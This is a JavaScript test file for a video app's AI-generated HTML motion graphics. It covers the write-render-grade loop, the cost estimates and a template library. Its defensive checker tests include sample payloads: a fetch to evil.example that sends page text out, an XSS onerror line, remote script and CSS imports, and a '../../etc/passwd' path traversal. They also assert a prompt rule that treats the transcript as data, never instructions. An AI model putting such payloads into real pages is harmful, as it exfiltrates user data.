// Custom graphics: the contract (static checks), hero moments on the owner's real run, the words-said check, the
// grade, the cost estimate, the saved look, and the write → render → grade → revise loop with a fake model and a
// fake sandbox (the real sandbox is in custom-graphics.e2e.cjs).
const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { loadMain } = require('../zernio/support/load-main.cjs')

const shared = loadMain("export * from './src/shared/custom-graphics'")
const RUN = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/custom-graphics-run.json'), 'utf8'))
const FAKE = path.join(__dirname, 'fake-custom-graphics')
const read = (name) => fs.readFileSync(path.join(FAKE, name), 'utf8')
const seconds = (html) => Number(/data-duration="([\d.]+)"/.exec(html)[1]) * 1000
const plain = (x) => JSON.parse(JSON.stringify(x))

test('our example and fake compositions follow the contract', () => {
  for (const e of shared.CUSTOM_EXAMPLES) assert.deepEqual(shared.checkComposition(e.html, { width: 1080, height: 800, durationMs: seconds(e.html) }), [], e.brief)
  for (const name of fs.readdirSync(FAKE).filter((f) => f.endsWith('.html'))) {
    // The Explainer's stand-in is a template the e2e test fills in ({{DUR}}, {{CUES}}...): checked filled in.
    const html = read(name).replaceAll('{{DUR}}', '12.00').replaceAll('{{N}}', '01').replaceAll('{{LABEL}}', 'product').replaceAll('{{HERO}}', 'product').replaceAll('{{STAMP}}', 'first').replaceAll('{{CUES}}', '1.2, 3.4')
    assert.deepEqual(shared.checkComposition(html, { width: 1080, height: 1267, durationMs: seconds(html) }), [], name)
  }
  // The writer's prompt carries the rules, the contract and the examples; it is the same for every moment (cacheable).
  const system = shared.writerSystemPrompt()
  assert.match(system, /DESIGN RULES/); assert.match(system, /COMPOSITION CONTRACT/); assert.match(system, /EXAMPLE 3/)
  assert.equal(system, shared.writerSystemPrompt())
  assert.ok(system.length < 16000)
})

test('the static check refuses what reaches out, loads, times itself, escapes or breaks the contract', () => {
  const good = shared.CUSTOM_EXAMPLES[1].html
  const expect = { width: 1080, height: 520, durationMs: 4000 }
  const inScript = (code) => good.replace('window.__timelines = [tl];', `${code}\nwindow.__timelines = [tl];`)
  const bad = {
    fetch: inScript("fetch('https://evil.example/x?d=' + document.body.innerText)"),
    xhr: inScript('new XMLHttpRequest()'),
    socket: inScript("new WebSocket('wss://evil.example')"),
    eval: inScript("eval('1')"),
    constructor: inScript("[].constructor.constructor('return 1')()"),
    escaped: inScript("window['\\u0066etch']('x')"),
    timer: inScript('setTimeout(() => 1, 5)'),
    clock: inScript('const t = Date.now()'),
    random: inScript('const r = Math.random()'),
    loop: inScript('while (true) {}'),
    open: inScript("window.open('https://evil.example')"),
    location: inScript("location.href = 'https://evil.example'"),
    storage: inScript("localStorage.setItem('a', 'b')"),
    importCall: inScript("import('https://evil.example/m.js')"),
    innerHTML: inScript("document.body.innerHTML = '<img src=x onerror=alert(1)>'"),
    makeScript: inScript("document.createElement('script')"),
    iframe: good.replace('<div class="panel">', '<iframe></iframe><div class="panel">'),
    image: good.replace('<div class="panel">', '<img alt=""><div class="panel">'),
    handler: good.replace('<div class="panel">', '<div class="panel" onclick="alert(1)">'),
    link: good.replace('<div class="panel">', '<a href="https://evil.example"><div class="panel">'),
    cssUrl: good.replace('#cg-root .no{', "#cg-root .no{background:url(https://evil.example/p.png);"),
    cssImport: good.replace('<style>', "<style>@import 'https://evil.example/a.css';"),
    cssAnimation: good.replace('#cg-root .no{', '#cg-root .no{transition:opacity 1s;'),
    unscoped: good.replace('<style>', '<style>body{background:red}'),
    rootSized: good.replace('<style>', '<style>#cg-root{width:2000px}'),
    twoScripts: good + '<script>window.__timelines = []</script>',
    scriptSrc: good.replace('<script>', '<script src="https://evil.example/x.js">'),
    comment: good.replace('<div class="panel">', '<!-- hi --><div class="panel">'),
    notPaused: good.replace('{ paused: true }', '{}'),
    noRegister: good.replace('window.__timelines = [tl];', ''),
    duration: good.replace('data-duration="4.00"', 'data-duration="9.00"'),
    endless: good.replace("duration: 0.45, ease: 'expo.out' }, 0)", "duration: 0.45, repeat: -1, ease: 'expo.out' }, 0)"),
    huge: good + ' '.repeat(shared.MAX_COMPOSITION_CHARS),
    document: '<html><body>' + good + '</body></html>'
  }
  for (const [name, html] of Object.entries(bad)) assert.ok(shared.checkComposition(html, expect).length > 0, `${name} is refused`)
  assert.match(shared.checkComposition(bad.fetch, expect).join(' '), /fetch/)
  assert.match(shared.checkComposition(bad.cssUrl, expect).join(' '), /url\(\)/)
  // A model's answer: the ```html block, or the composition after a line of chatter.
  assert.equal(shared.extractComposition('Sure!\n```html\n' + good + '\n```\nDone.'), good.trim())
  assert.ok(shared.extractComposition('Here it is: ' + good).startsWith('<div id="cg-root"'))
})

test('hero moments on the owner\'s run: the opening twist, the staircase, warm vs cold, organic vs ads and the $8,188 proof', () => {
  const candidates = RUN.graphics.map((g) => ({ ref: g.id, word: 0, atMs: g.at_ms, durationMs: g.duration_ms, template: g.template, fields: g.fields, size: g.size, placement: g.placement }))
  candidates.push({ ref: 'line:0', word: 0, atMs: 53, durationMs: 6550, template: 'line', fields: {} })
  // About one every 20 s (a 4-minute reel: up to 12; the run's candidates and spacing give 9).
  assert.equal(shared.heroCount(RUN.duration_ms), 12)
  const heroes = plain(shared.pickHeroMoments(candidates, { durationMs: RUN.duration_ms }))
  const by = (template) => RUN.graphics.find((g) => g.template === template && heroes.some((h) => h.ref === g.id))
  assert.deepEqual(heroes.map((h) => h.kind), ['claim', 'process', 'proof', 'comparison', 'claim', 'comparison', 'process', 'proof', 'proof'])
  // Only the opening (under the hook) stays a card; the rest get the stage or a Visual scene.
  assert.deepEqual(heroes.map((h) => h.frame), ['card', 'visual', 'stage', 'stage', 'stage', 'visual', 'stage', 'stage', 'stage'])
  // The warm vs cold audience line swap is a comparison too.
  assert.equal(RUN.graphics.find((g) => g.id === heroes[3].ref).fields.effect, 'line-swap')
  assert.equal(heroes[0].replaces, null); assert.equal(heroes[0].placement, 'bottom')
  assert.ok(by('staircase') && by('compare_marks'))
  assert.equal(RUN.graphics.find((g) => g.id === heroes[7].ref).fields.value, '$8,188')
  // Never a CTA, a screen recording or a name tag; never two within the spacing.
  assert.ok(!heroes.some((h) => ['link_cta', 'screen_frame', 'lower_third'].includes(RUN.graphics.find((g) => g.id === h.ref)?.template)))
  for (let i = 1; i < heroes.length; i++) assert.ok(heroes[i].atMs - heroes[i - 1].atMs >= 10000)
  // A YouTube video gets about one per 90 s (at least 3, at most 12); custom ones already made keep their slot.
  assert.equal(shared.heroCount(26 * 60000, 'youtube'), 12)
  const again = shared.pickHeroMoments([...candidates, { ref: 'g-made', word: 0, atMs: 36000, durationMs: 13000, template: 'custom', fields: {} }], { durationMs: RUN.duration_ms })
  assert.ok(again.some((h) => h.ref === 'g-made') && !again.some((h) => RUN.graphics.find((g) => g.id === h.ref)?.template === 'staircase'))
  // A proof on the stage lasts long enough to read; never into the next graphic.
  assert.equal(shared.heroDuration({ atMs: 196793, durationMs: 3000, frame: 'stage' }, 209687, RUN.duration_ms), 4500)
  assert.equal(shared.heroDuration({ atMs: 196793, durationMs: 3000, frame: 'stage' }, 199000, RUN.duration_ms), 1907)
})

test('words said: numbers as said (in words too), any form of a said word; anything else is caught', () => {
  const said = shared.saidIndex(RUN.words)
  assert.deepEqual(shared.unsaidOnScreen(['$8,188', 'generated', '$4,365 on ads', 'October 20th', 'a few people', 'organic content', 'step 2', 'three million'], said), [])
  assert.deepEqual(shared.unsaidOnScreen(['10 million', 'guaranteed', '7x faster'], said), ['10', 'guaranteed', '7', 'faster'])
  assert.deepEqual(shared.unsaidOnScreen(['$9,999'], said), ['9,999'])
})

test('the grade: JSON (fenced or not); a pass needs every check and 7+; unreadable fails', () => {
  assert.deepEqual(plain(shared.parseGrade('```json\n{"pass": true, "score": 8, "failed": [], "fixes": []}\n```')), { pass: true, score: 8, failed: [], fixes: [] })
  const fail = shared.parseGrade('{"pass": true, "score": 6, "failed": ["face", "made-up"], "fixes": ["Move the panel down 120 px."]}')
  assert.equal(fail.pass, false); assert.deepEqual(plain(fail.failed), ['face']); assert.deepEqual(plain(fail.fixes), ['Move the panel down 120 px.'])
  assert.equal(shared.parseGrade('looks great!').pass, false)
  assert.equal(shared.parseGrade('{"pass": true, "score": 9, "failed": ["clipped"]}').pass, false)
})

test('cost: about the target for a short video\'s moments, fewer revisions for an expensive model', () => {
  const e = shared.customGraphicsEstimate(4)
  // About the target (the first, uncached write and the one world call come on top).
  assert.ok(e.expectedUsd > 0.2 && e.expectedUsd <= 0.8, `4 moments expected ${e.expectedUsd}`)
  assert.ok(e.mostUsd >= e.expectedUsd)
  assert.equal(e.revisions, 2)
  assert.ok(shared.customGraphicsEstimate(5).expectedUsd <= 0.85)
  const pricey = { input: 15e-6, output: 75e-6 }
  assert.ok(shared.revisionCap(5, pricey) < 2)
  assert.equal(shared.revisionCap(3, { input: 0.3e-6, output: 1.2e-6 }), 2)
  assert.equal(shared.callCost({ cost: 0.042 }), 0.042)
  assert.ok(Math.abs(shared.callCost({ prompt_tokens: 1000, completion_tokens: 100 }, { input: 1e-6, output: 2e-6 }) - 0.0012) < 1e-12)
})

test('geometry: the band per frame kind, the fit at bake, the still times', () => {
  const visual = plain(shared.customGeometry('visual', { hook: 0 }))
  assert.deepEqual(visual.root, { x: 0, y: 154, width: 1080, height: 1267 })
  const stage = plain(shared.customGeometry('stage', { hook: 0 }))
  assert.equal(stage.root.height, 806); assert.ok(stage.card.y > stage.root.y + stage.root.height)
  assert.deepEqual(plain(shared.fitRoot({ width: 1080, height: 1267 }, { x: 0, y: 154, width: 1080, height: 1267 })), { x: 0, y: 154, scale: 1 })
  assert.deepEqual(plain(shared.fitRoot({ width: 1080, height: 1267 }, { x: 0, y: 300, width: 1080, height: 1000 })), { x: 114, y: 300, scale: 0.7893 })
  // Four stills: coming in, building (about the middle cue), built (after the last cue), leaving.
  const times = shared.stillTimes(13030, [700, 3900, 10430])
  assert.equal(times.length, shared.STILL_COUNT)
  assert.ok(times[0] < times[1] && times[1] < times[2] && times[2] < times[3] && times[3] < 13030 && times[2] > 10430 && times[1] > 3900 && times[1] < 10430, String(times))
})

test('a saved look keeps colors and our fonts only (its values go into the sandbox page\'s CSS)', () => {
  const look = shared.customLook({ kind: 'visual', brandColor: null, font: 'serif' })
  assert.equal(look.ground, '#1F4E9C'); assert.equal(look.ink, '#FFFFFF')
  assert.ok(shared.contrast(look.accent, look.ground) >= 2.2)
  assert.deepEqual(plain(shared.parseLook(look)), plain(look))
  assert.equal(shared.parseLook({ ...look, accent: 'red;} body{background:url(https://x)' }), null)
  assert.equal(shared.parseLook({ ...look, display: '"Comic Sans"' }), null)
  const card = shared.customLook({ kind: 'card', brandColor: '#FFD400', font: 'clean' })
  assert.equal(card.ground, 'video'); assert.ok(shared.contrast(card.accentInk, '#FFFFFF') >= 4.4)
})

function mainModule() {
  return loadMain("export * from './src/main/custom-graphics'", {
    electron: { app: { isPackaged: false, getPath: () => os.tmpdir() } }, './custom-render': { customSandbox: () => { throw new Error('use the fake') } },
    './settings-store': { loadSettings: () => ({ openrouterApiKey: '' }) }, './member-prefs': { readMemberPrefs: () => ({ create: {} }) }, './openrouter-models': { getModelCatalog: async () => ({ planning: [] }) },
    './logger': { logger: { info() {}, warn() {} } }
  })
}

function brief(name, kind, frame, durationMs) {
  const geometry = shared.customGeometry(frame, { hook: 0 })
  return { kind, frame, durationMs, geometry, look: shared.customLook({ kind: frame, font: 'serif' }), cues: [{ word: 'product', at: 0.9 }], before: '', after: '', planned: name }
}

test('the loop: a too-small first try is sent back with our fix, then kept; files named by the hash; costs counted', async () => {
  const m = mainModule()
  const run = fs.mkdtempSync(path.join(os.tmpdir(), 'custom-loop-'))
  const html = read('staircase.html')
  const calls = []
  const call = async (request) => {
    calls.push(request)
    if (request.purpose === 'grade') return { text: '{"pass": true, "score": 8, "failed": [], "fixes": []}', costUsd: 0.02 }
    return { text: '```html\n' + html + '\n```', costUsd: 0.08 }
  }
  let shots = 0
  const sandbox = { stills: async (req) => {
    shots++
    assert.equal(req.times.length, 4); assert.equal(req.scale, 0.5); assert.equal(req.motionStepMs, 100)
    return { transparent: [Buffer.from('a'), Buffer.from('b'), Buffer.from('c'), Buffer.from('d')], composite: Buffer.from('jpg'), texts: ['only three things', 'a product', 'an offer', 'attract', 'eyeballs'],
      problems: shots === 1 ? ['Some words are only about 28 px tall; make every label at least 44 px.'] : [] }
  } }
  const result = await m.produceCustomGraphic({ run, brief: brief('Staircase', 'process', 'visual', 12000), words: 'a product an offer attract eyeballs',
    said: shared.saidIndex(RUN.words), frame: null, fallback: { template: 'staircase', fields: { items: 'a\nb\nc' }, duration_ms: 13030, placement: 'middle' }, model: 'anthropic/claude-opus-5.5', maxRevisions: 2 },
  { call, sandbox })
  assert.equal(result.tries, 2)
  assert.ok(Math.abs(result.costUsd - 0.2) < 1e-9)
  const revision = calls.filter((c) => c.purpose === 'write')[1]
  assert.match(revision.user, /YOUR PREVIOUS COMPOSITION/); assert.match(revision.user, /at least 44 px/)
  // Our own check fails a graphic whatever the grade says, and the grader is told what we found.
  assert.match(calls.find((c) => c.purpose === 'grade').user, /Our automatic checks found: Some words are only about 28 px/)
  const comp = result.meta.comp
  assert.equal(comp, require('node:crypto').createHash('sha256').update(html.trim()).digest('hex').slice(0, 16))
  const found = m.readCustomGraphic(run, comp)
  assert.equal(found.html, html.trim()); assert.equal(found.meta.fallback.template, 'staircase'); assert.equal(found.meta.tries, 2)
  assert.deepEqual(m.customStillPaths(run, comp).map((p) => path.basename(p)), [`${comp}-0.png`, `${comp}-1.png`, `${comp}-2.png`, `${comp}-3.png`])
  // A composition changed on disk no longer matches its name: it isn't drawn.
  fs.appendFileSync(path.join(run, '.graphics', 'custom', `${comp}.html`), '<script>fetch("x")</script>')
  assert.equal(m.readCustomGraphic(run, comp), null)
  assert.equal(m.readCustomGraphic(run, '../../etc/passwd'), null)
  fs.rmSync(run, { recursive: true, force: true })
})

test('the loop: unsaid words and refused code are fixed or dropped (the template stays); no grade when the model can\'t see', async () => {
  const m = mainModule()
  const run = fs.mkdtempSync(path.join(os.tmpdir(), 'custom-loop-'))
  const good = read('proof.html')
  const writes = []
  const call = async (request) => {
    if (request.purpose === 'grade') throw new Error('no grade expected')
    writes.push(request.user)
    return { text: writes.length === 1 ? good.replace('<script>', '<script>fetch("https://evil.example");') : good.replace(/\$8,188/g, '10 million'), costUsd: 0.05 }
  }
  const sandbox = { stills: async () => ({ transparent: [], composite: Buffer.from('x'), texts: ['10 million', 'on ads'], problems: [] }) }
  const result = await m.produceCustomGraphic({ run, brief: brief('Stat', 'proof', 'stage', 4500), words: 'eight thousand', said: shared.saidIndex(RUN.words), frame: null, fallback: null,
    model: 'z-ai/glm-5.3-flash', maxRevisions: 2, grade: false }, { call, sandbox })
  assert.equal(result.meta, null)
  assert.equal(result.tries, 3)
  assert.match(writes[1], /may not use fetch/)
  assert.match(result.reason, /not said/)
  // Nothing kept as a graphic (each try is kept for review under attempts/).
  assert.ok(!fs.readdirSync(path.join(run, '.graphics', 'custom')).some((n) => n !== 'attempts'))
  fs.rmSync(run, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------
// My motion library
// ---------------------------------------------------------------------------

const lib = loadMain("export * from './src/shared/motion-library'")

test('library templates: every text becomes a slot, filling escapes words and sets the length, a fill must fit', () => {
  const html = read('staircase.html')
  const { template, slots } = lib.parameterize(html)
  assert.deepEqual(plain(slots.map((s) => s.sample)), ['only three things', '3', 'a product', 'an offer', 'attract', 'eyeballs'])
  assert.ok(!template.includes('>a product<') && template.includes('>{{s3}}<'))
  // Style and script are left alone.
  assert.ok(template.includes("tl.from('#cg-root .title'"))
  const filled = lib.fillTemplate(template, { s1: 'two things', s2: '2', s3: 'a list', s4: 'an <offer>', s5: 'get', s6: 'buyers' }, 9000)
  assert.ok(filled.includes('an &lt;offer&gt;') && filled.includes('data-duration="9.00"'))
  assert.deepEqual(shared.checkComposition(filled, { width: 1080, height: 1267, durationMs: 9000 }), [])
  assert.throws(() => lib.fillTemplate(template, { s1: 'x' }, 9000), /Slot s2/)
  const fit = lib.parseFill('{"fits": true, "values": {"s1": "two things", "s2": "2", "s3": "a list", "s4": "an offer", "s5": "get", "s6": "buyers"}}', slots)
  assert.equal(fit.fits, true)
  assert.equal(lib.parseFill('{"fits": true, "values": {"s1": "a much much much much longer line than before"}}', slots).fits, false)
  assert.equal(lib.parseFill('{"fits": false}', slots).fits, false)
  // Candidates: active, same kind and frame, about the same length, most used first.
  const item = (id, extra) => ({ id, kind: 'process', frame: 'visual', width: 1080, height: 1267, durationMs: 12000, tags: [], slots, idea: 'x', status: 'active', usedIn: ['r1'], createdAt: '2026-10-25', ...extra })
  const list = [item('a'.repeat(16), { usedIn: ['r1', 'r2'] }), item('b'.repeat(16), { status: 'retired' }), item('c'.repeat(16), { frame: 'stage' }), item('d'.repeat(16), { durationMs: 4000 }), item('e'.repeat(16))]
  assert.deepEqual(lib.libraryCandidates(list, 'process', 'visual', 13000).map((i) => i.id), ['a'.repeat(16), 'e'.repeat(16)])
})

test('the library in the loop: a passed graphic is kept, the next fitting moment fills it (no new design), a failure is retired', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'motion-library-'))
  const electron = { app: { isPackaged: false, getPath: () => root } }
  const libMain = loadMain("export * from './src/main/motion-library'", { electron, './security': { authorizeMedia: (p) => p }, './logger': { logger: { info() {}, warn() {} } } })
  libMain.setLibraryRoot(path.join(root, 'motion-library'))
  const m = mainModule()
  const hooks = { match: libMain.libraryMatch, get: libMain.readLibraryTemplate, keep: libMain.keepInLibrary, used: libMain.noteLibraryUse }
  const html = read('staircase.html')
  const purposes = []
  const call = async (request) => {
    purposes.push(request.purpose)
    if (request.purpose === 'grade') return { text: '{"pass": true, "score": 8, "failed": [], "fixes": []}', costUsd: 0.02 }
    if (request.purpose === 'fill') return { text: JSON.stringify({ fits: true, values: Object.fromEntries([...request.user.matchAll(/- (s\d+): "([^"]*)"/g)].map((x) => [x[1], x[2]])) }), costUsd: 0.004 }
    return { text: '```html\n' + html + '\n```', costUsd: 0.08 }
  }
  const sandbox = { stills: async () => ({ transparent: [Buffer.from('p0'), Buffer.from('p1'), Buffer.from('p2')], composite: Buffer.from('j'), texts: ['only three things', 'a product'], problems: [] }) }
  const input = (run) => ({ run, brief: brief('Staircase', 'process', 'visual', 12000), words: 'a product an offer attract eyeballs', said: shared.saidIndex(RUN.words), frame: null, fallback: null, model: 'm/x', maxRevisions: 2 })
  const runA = path.join(root, 'edit-a'), runB = path.join(root, 'edit-b')
  fs.mkdirSync(runA); fs.mkdirSync(runB)
  const first = await m.produceCustomGraphic(input(runA), { call, sandbox, library: hooks })
  assert.ok(first.meta && !first.library)
  assert.deepEqual(purposes, ['write', 'grade'])
  const view = libMain.libraryView()
  assert.equal(view.length, 1); assert.equal(view[0].status, 'active'); assert.equal(view[0].uses, 1); assert.equal(view[0].stills.length, 3)
  // The next video: the same kind of moment is filled from the library (a small call), not designed again.
  purposes.length = 0
  const second = await m.produceCustomGraphic(input(runB), { call, sandbox, library: hooks })
  assert.equal(second.library, view[0].id)
  assert.deepEqual(purposes, ['fill', 'grade'])
  assert.ok(second.costUsd < 0.03)
  assert.equal(libMain.libraryView()[0].uses, 2)
  // A note asks for a change: designed again, not filled.
  purposes.length = 0
  await m.produceCustomGraphic({ ...input(runB), brief: { ...brief('Staircase', 'process', 'visual', 12000), note: 'use a ladder' } }, { call, sandbox, library: hooks })
  assert.equal(purposes[0], 'write')
  // Retire it: not offered any more; restore brings it back.
  libMain.setLibraryStatus(view[0].id, 'retired')
  assert.equal(libMain.libraryMatch('process', 'visual', 12000), null)
  libMain.setLibraryStatus(view[0].id, 'active')
  assert.ok(libMain.libraryMatch('process', 'visual', 12000))
  // One that never passes is kept as Retired, with the reason.
  const failing = async (request) => request.purpose === 'grade' ? { text: '{"pass": false, "score": 4, "failed": ["design"], "fixes": ["Too busy."]}', costUsd: 0.02 }
    : { text: '```html\n' + read('proof.html') + '\n```', costUsd: 0.08 }
  const failed = await m.produceCustomGraphic({ ...input(runB), brief: brief('Stat', 'proof', 'stage', 4500), maxRevisions: 1 }, { call: failing, sandbox, library: hooks })
  assert.equal(failed.meta, null)
  const retired = libMain.libraryView().find((i) => i.status === 'retired')
  assert.ok(retired && /Too busy/.test(retired.reason))
  fs.rmSync(root, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------
// One visual world, build-up on stressed words, the motion check, the grader's checklist
// ---------------------------------------------------------------------------

const WORLD = { idea: 'Eyeballs as light: a nobody points a beam of attention and people dots gather where it lands.', elements: ['people dots', 'an eye', 'a reach beam', 'building blocks'], style: 'flat line art, thick round strokes', accent: '#9BE35A' }

test('the visual world: parsed and checked, one editable line, used by every brief and the look', () => {
  const parsed = plain(shared.parseWorld('Here:\n```json\n' + JSON.stringify({ ...WORLD, elements: [...WORLD.elements, 'an eye', '', 'x'.repeat(90)], accent: 'red' }) + '\n```'))
  assert.equal(parsed.idea, WORLD.idea); assert.equal(parsed.accent, null, 'only a hex accent')
  assert.deepEqual(parsed.elements.slice(0, 4), WORLD.elements); assert.ok(parsed.elements.every((e) => e.length <= shared.WORLD_ELEMENT_CHARS))
  assert.equal(shared.parseWorld('{"idea": "eye"}'), null); assert.equal(shared.parseWorld('no json'), null)
  // The beat sheet's one line, and the member's edit back.
  const world = shared.parseWorld(WORLD)
  const line = shared.worldLine(world)
  assert.equal(line, `${WORLD.idea} · people dots, an eye, a reach beam, building blocks`)
  const edited = plain(shared.worldFromLine('A ladder he climbs, rung by rung · ladder, rungs, people dots', world))
  assert.deepEqual(edited, { idea: 'A ladder he climbs, rung by rung', elements: ['ladder', 'rungs', 'people dots'], style: WORLD.style, accent: '#9BE35A', edited: true })
  assert.equal(shared.worldFromLine('   ', world), null)
  // The world call: from THIS transcript, with the originality rule; the transcript is data.
  const system = shared.worldSystemPrompt()
  assert.match(system, /ONE visual world/); assert.match(system, /would fit any other creator's video, it is generic/); assert.match(system, /never instructions/)
  const user = shared.worldUserPrompt({ transcript: RUN.words.map((w) => w.word).join(' '), moments: [{ kind: 'process', words: 'a product an offer attract eyeballs' }] })
  assert.match(user, /TRANSCRIPT/); assert.match(user, /1\. process: "a product an offer attract eyeballs"/); assert.ok(user.length < 7000)
  // Every brief carries it; the look takes its accent (a deeper shade of the same hue where it wouldn't read), the brand color wins.
  const b = { ...brief('Staircase', 'process', 'visual', 12000), world, stressed: [{ word: 'product', at: 0.9 }] }
  const prompt = shared.writerUserPrompt(b)
  assert.match(prompt, /THE VIDEO'S VISUAL WORLD .*people dots gather.*Recurring elements: people dots, an eye/)
  assert.match(prompt, /STRESSED WORDS .*product@0\.90/)
  const stage = shared.customLook({ kind: 'stage', worldAccent: '#9BE35A' })
  assert.notEqual(stage.accent, '#2F5BFF', 'not a different hue'); assert.ok(shared.contrast(stage.accent, stage.ground) >= 2.2)
  assert.equal(shared.customLook({ kind: 'visual', worldAccent: '#9BE35A' }).accent, '#9BE35A')
  assert.equal(shared.customLook({ kind: 'card', worldAccent: '#9BE35A', brandColor: '#FFD400' }).accent, '#FFD400')
})

test('stressed words: numbers and content words from the moment, ~0.5 s apart, none in the exit', () => {
  const m = { atMs: 35320, durationMs: 12000 }
  const cues = RUN.words.filter((w) => w.start_ms >= m.atMs - 1200 && w.start_ms < m.atMs + m.durationMs).map((w) => ({ word: w.word, at: Math.round((w.start_ms - m.atMs) / 10) / 100 }))
  const stressed = plain(shared.stressedWords(cues, m.durationMs))
  const words = stressed.map((s) => s.word.toLowerCase())
  for (const w of ['product', 'offer', 'attracts', 'people', 'three', 'eyeballs']) assert.ok(words.includes(w), `${w} in ${words.join(' ')}`)
  for (const w of ['we\'re', 'gonna', 'that', 'and', 'a', 'to']) assert.ok(!words.includes(w), w)
  for (let i = 1; i < stressed.length; i++) assert.ok(stressed[i].at - stressed[i - 1].at >= 0.45)
  assert.ok(stressed.every((s) => s.at >= 0 && s.at < m.durationMs / 1000 - 0.4))
  // Roughly one every 0.5–1 s of speech.
  assert.ok(stressed.length >= 10 && stressed.length <= 24, String(stressed.length))
  assert.ok(shared.stressScore('8,188') > shared.stressScore('product') && shared.stressScore('the') === 0)
})

test('the motion check: flat stretches over 1.5 s while drawn, and the fix names a word said there', () => {
  // 0.1 s steps: moving for 1 s, still for 2.5 s, moving, then gone (not drawn: never flat).
  const change = [0, ...Array(10).fill(0.01), ...Array(25).fill(0), ...Array(10).fill(0.01), ...Array(30).fill(0)]
  const visible = change.map((_, i) => i < 46)
  const flats = plain(shared.flatStretches(change, visible))
  assert.deepEqual(flats, [{ fromMs: 1000, toMs: 3500 }])
  assert.deepEqual(plain(shared.flatStretches(change, visible, { maxMs: 3000 })), [])
  // Gentle idle motion counts as change; a tiny change below the threshold does not.
  assert.deepEqual(plain(shared.flatStretches(change.map((c, i) => i > 10 && i < 36 ? 0.0005 : c), visible)), [])
  assert.equal(shared.flatStretches(change.map((c, i) => i > 10 && i < 36 ? 0.00001 : c), visible).length, 1)
  const fixes = shared.motionFixes(flats, [{ word: 'We\'re', at: 1.2 }, { word: 'offer', at: 2.3 }, { word: 'that', at: 2.9 }])
  assert.match(fixes[0], /^Flat at 1\.0–3\.5 s: nothing changes\. Add a change on “offer” \(2\.30 s\)/)
  assert.match(shared.motionFixes([{ fromMs: 0, toMs: 2000 }], [])[0], /gently alive/)
})

test('the grader checks focus, build-up, specificity, the world, phone readability, clipping, the face and invented words', () => {
  const ids = shared.GRADE_CHECKS.map((c) => c.id)
  for (const id of ['focus', 'builds', 'specific', 'world', 'readable', 'clipped', 'face', 'words']) assert.ok(ids.includes(id), id)
  const system = shared.graderSystemPrompt()
  assert.match(system, /four stills/); for (const c of shared.GRADE_CHECKS) assert.ok(system.includes(`- ${c.id}: `))
  const user = shared.graderUserPrompt({ words: 'a product an offer', kind: 'process', frame: 'visual', machine: ['Flat at 4.2–6.0 s: nothing changes.'], world: shared.parseWorld(WORLD), stressed: [{ word: 'product', at: 0.9 }, { word: 'offer', at: 4.2 }] })
  assert.match(user, /visual world: Eyeballs as light/); assert.match(user, /build on: product, offer/); assert.match(user, /Flat at 4\.2/)
  const graded = shared.parseGrade('{"pass": false, "score": 6, "failed": ["builds", "world"], "fixes": ["Add the crowd on people."]}')
  assert.deepEqual(plain(graded.failed), ['builds', 'world'])
  // The rules ask for build-up, idle motion and one focus (no more "dead still").
  assert.match(shared.DESIGN_RULES, /Build it up on the voice/); assert.match(shared.DESIGN_RULES, /Alive, never frozen/); assert.match(shared.DESIGN_RULES, /Exactly ONE focus/)
  assert.doesNotMatch(shared.DESIGN_RULES, /dead still/)
  // Talking-head reels: a hero holds 3–8 s (12 s for a process or comparison) and returns to the face.
  assert.equal(shared.heroDuration({ atMs: 60000, durationMs: 15000, frame: 'stage', kind: 'proof' }, null, 300000), 8000)
  assert.equal(shared.heroDuration({ atMs: 35320, durationMs: 13030, frame: 'visual', kind: 'process' }, null, 300000), 12000)
  assert.equal(shared.heroDuration({ atMs: 35320, durationMs: 13030, frame: 'visual', kind: 'process' }, null, 300000, 'youtube'), 13030)
  assert.equal(shared.heroDuration({ atMs: 53, durationMs: 2000, frame: 'card', kind: 'claim' }, null, 300000), 3000)
})

test('the loop: the world call, the world in every brief and grade; a flat stretch goes back to the writer, then a still-flat best is kept', async () => {
  const m = mainModule()
  const run = fs.mkdtempSync(path.join(os.tmpdir(), 'custom-world-'))
  const calls = []
  const call = async (request) => {
    calls.push(request)
    if (request.purpose === 'world') return { text: JSON.stringify(WORLD), costUsd: 0.006 }
    if (request.purpose === 'grade') return { text: '{"pass": true, "score": 8, "failed": [], "fixes": []}', costUsd: 0.02 }
    return { text: '```html\n' + read('staircase.html') + '\n```', costUsd: 0.08 }
  }
  const proposed = await m.proposeVisualWorld({ transcript: 'we need a product an offer and eyeballs', moments: [{ kind: 'process', words: 'a product an offer' }], model: 'm/x' }, { call })
  assert.equal(proposed.world.idea, WORLD.idea); assert.equal(calls[0].purpose, 'world')
  m.saveVisualWorld(run, proposed.world)
  assert.deepEqual(plain(m.readVisualWorld(run)), plain(proposed.world))
  // An unusable answer: no world (the graphics are designed without one).
  assert.equal((await m.proposeVisualWorld({ transcript: 'x', moments: [], model: 'm/x' }, { call: async () => ({ text: 'sorry', costUsd: 0.001 }) })).world, null)
  // The sandbox measures it flat from 4.2 s to 9.9 s every time.
  const flatChange = Array.from({ length: 121 }, (_, i) => (i > 42 && i < 99 ? 0 : 0.01))
  const sandbox = { stills: async () => ({ transparent: [Buffer.from('a'), Buffer.from('b'), Buffer.from('c'), Buffer.from('d')], composite: Buffer.from('j'), texts: ['only three things', 'a product'], problems: [],
    motion: { change: flatChange, visible: flatChange.map(() => true) } }) }
  const cues = [{ word: 'product', at: 0.9 }, { word: 'offer', at: 4.2 }, { word: 'attracts', at: 5.4 }, { word: 'people', at: 6.0 }, { word: 'eyeballs', at: 10.9 }]
  const b = { ...brief('Staircase', 'process', 'visual', 12000), cues, world: proposed.world, stressed: shared.stressedWords(cues, 12000) }
  calls.length = 0
  const result = await m.produceCustomGraphic({ run, brief: b, words: 'a product an offer attract eyeballs', said: shared.saidIndex(RUN.words), frame: null, fallback: null, model: 'm/x', maxRevisions: 1 }, { call, sandbox })
  const writes = calls.filter((c) => c.purpose === 'write'), grades = calls.filter((c) => c.purpose === 'grade')
  assert.equal(writes.length, 2, 'revised once for the flat stretch')
  assert.match(writes[0].user, /THE VIDEO'S VISUAL WORLD/); assert.match(writes[0].user, /STRESSED WORDS/)
  assert.match(writes[1].user, /Flat at 4\.2–9\.8 s: nothing changes\. Add a change on “(attracts|people)”/)
